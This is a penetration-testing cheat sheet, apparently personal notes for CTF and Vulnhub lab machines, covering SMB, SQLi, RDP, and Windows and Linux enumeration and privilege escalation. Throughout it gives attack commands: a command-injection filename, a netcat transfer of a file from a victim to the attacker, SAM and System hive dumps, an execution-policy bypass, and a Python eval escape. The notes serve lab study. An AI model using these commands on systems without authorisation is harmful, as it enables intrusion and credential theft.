# Service Enumeration

## SMB

- https://0xdf.gitlab.io/2018/12/02/pwk-notes-smb-enumeration-checklist-update1.html
- `nmap IP --script 'smb-vuln\*' -p139,445`
- `smbmap -H IP`
- Sometimes the following error occurs
	- `protocol negotiation failed: NT_STATUS_CONNECTION_DISCONNECTED`
	- https://forums.offensive-security.com/showthread.php?26657-enum4linux-and-smbclient-fix-for-quot-protocol-negotiation-failed-NT_STATUS_CONNECTION_DISCONNECTED-quot&highlight=version
	- The fix was to add `client min protocl = LANMAN1`

## SQLi

- Try basic payloads
	- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/README.md
- **Don't use sqlmap**
- https://www.exploit-db.com/raw/12975
	- MSSQL 
	- see MAIL

## RDP

- If in remmina it doesn't connect try to change the `security protocol negotiation` to RDP
- If in case you have to use proxy in remmina and SSH tunnel won't do then do the following
	- Add the connection via remmina GUI without any SSH tunnel
	- go to `.local/share/remmina/` and find the file
	- Add all proxy setting there(https://gitlab.com/Remmina/Remmina/-/merge_requests/1927)   - Backups mostly contains .gz or .bak, if any file with non root perms is there or any file without those extension then check that out.

# General

* If you have downloaded the VM from Website like Vulnhub or any other website then make sure you run it in `host-only` mode. Even though Vulnhub can be super trusted but still it's good to be paranoid.
    - Most of the VM with `bridged` as their default network setting.
    - Also if you want to be super paranoid then go for NAT setting but I've had issues with some VMs in `NAT` network setting.

* Enumeration is the Key but only till a certain level. Lot of times the way is too guessy, too CTF type and that point `enumeration` doesn't help at all. So if you have done the basics of enumeration like for HTTP service fuzzing, dirsearch etc then don't worry it's totally okay to ask for a damn hint.

* Always take a good look of what you've found
* php file type can be bypassed by php5
* If in a file upload the output is shown meaning it's processing the upload
    - exploit it with command injection in filename like "shell.txt;id"
* Change Static IP
    - `sudo ifconfig vmnet1 10.10.10.11 netmask 255.255.255.0`
* VMware /dev/vmmon not loaded
    - `sudo vmware-modconfig --console --install-all`

* `sudo vmware-modconfig --console --install-all`
    - Fix the issue of vmware modprobe error

* If cracking password for kdbx takes longer time then try finding a key file for it.
* For git repos always check out the git logs
* If for some reason dirsearch or gobuster doesn't work on any URL or if they show every URL as the right try to use wfuzz
    - `wfuzz -c -w wordlist --hw 12 --hc 400 URL`n

## Windows

* Reverse shell for windows
    - https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/
    - If you can upload any file then try to upload `nc.exe` and use that.

* To get enumeration file use
    - `certutils -urlcache -split -f URL`
    - when powershell is present
        + `Invoke-WebRequest URL -outfile file`

* Use powerups.ps1 enumeration script
    - https://raw.githubusercontent.com/HarmJ0y/PowerUp/master/PowerUp.ps1
    - Run it with `powershell.exe -ExecutionPolicy Bypass -File .\powersup.ps1`
- checking privileges

```bash
whoami /all
whoami /priv
```

- https://github.com/itm4n/PrintSpoofer
        - Incase we need to exploit some `priv`
        - Check Disco
-  Dump SAM and System
        ```
        reg save HKLM\SAM c:\SAM
        reg save HKLM\System c:\System
        ```

-  Check file and folder permissions `cacls` or `icacls`
-  In order to see service information
        -  `sc.exe qc <servicename>`
- Path Traversal
        - https://gracefulsecurity.com/path-traversal-cheat-sheet-windows/
- Always check `whoami /priv`
- In windows run winpeas.exe like `.\winpeas.exe`
- If doing manual enum run
        - `reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"`i

## Linux

* Change host timezone
    - `echo "Asia/kolkata" > /etc/timezone`
    - `dpkg-reconfigure -f noninteractive tzdata`
* Always run dirsearch with extensions
    - `python dirsearch.py -f -e html,php,tar.gz,txt,xml,zip,jpg,png,jpeg -u IP LIST`
* Port knocking with nmap
    - `for x in 066 666 3432; do nmap -Pn --max-retries 0 -p $x 10.10.10.10; done`
    - If you find set of 3 numbers possible options is port knocking
* Transfer with ncat
    - `nc -q1 -lvp 1234 < file` - on victim machine
    - `nc IP 1234> file` - on attackers machine
* use `dig axfr somedomain` to actually find other zone tranfser
    - checkout tempus fugit writeup
* If enum/sudo doesn't do any good.....check for writeable dirs
    - `find / -type d 2>/dev/null`
* LFI to RCE via SSH log poisoning
    - https://www.hackingarticles.in/rce-with-lfi-and-ssh-log-poisoning/
* To escape eval in python
    - https://nedbatchelder.com/blog/201206/eval_really_is_dangerous.html
    - `eval("__import__('os').system('ls')#")``

* Remote port forwarding:
    - ssh -R port-to-frwd:internal-IP:service-port mzfr@user-IP
    - `ssh -R 44325:192.168.100.1:443 mzfr@192.168.56.1`
* If you don't find anything in /opt or /var/ then checkout /logs and /backups

